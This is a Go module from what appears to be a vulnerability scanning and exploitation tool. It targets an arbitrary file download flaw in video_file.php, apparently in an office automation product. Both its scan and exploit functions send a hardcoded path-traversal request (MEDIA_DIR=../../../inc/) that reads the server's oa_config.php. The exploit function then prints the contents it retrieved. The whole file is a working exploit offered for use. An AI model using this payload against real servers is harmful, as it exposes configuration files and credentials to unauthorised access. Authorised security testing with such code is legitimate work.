package vulners

import (
	"strings"

	"github.com/fatih/color"
)

type Td02 struct {
}

func (c *Td02) Scan(targetUrl string) {
	vulnerable, err := Td02scancore(targetUrl)
	if err != nil {
		color.Red("[X]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Td02] 存在video_file.php 任意文件下载")
	} else {
		color.White("[Td02] 不存在video_file.php 任意文件下载")
	}
}

func (*Td02) Exploit(targetUrl string) {
	runResult, err := Td02runcore(targetUrl)
	if err != nil {
		color.Red("[X]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Td02scancore(targetUrl string) (bool, error) {
	url := "/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
	resp, err := baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "PATH") {
		return true, nil
	} else {
		return false, nil
	}
}

func Td02runcore(targetUrl string) (string, error) {
	url := "/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
	resp, err := baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "PATH") {
		return "[Td02] 存在video_file.php 任意文件下载\n" + resContent, nil
	} else {
		return "", nil
	}
}
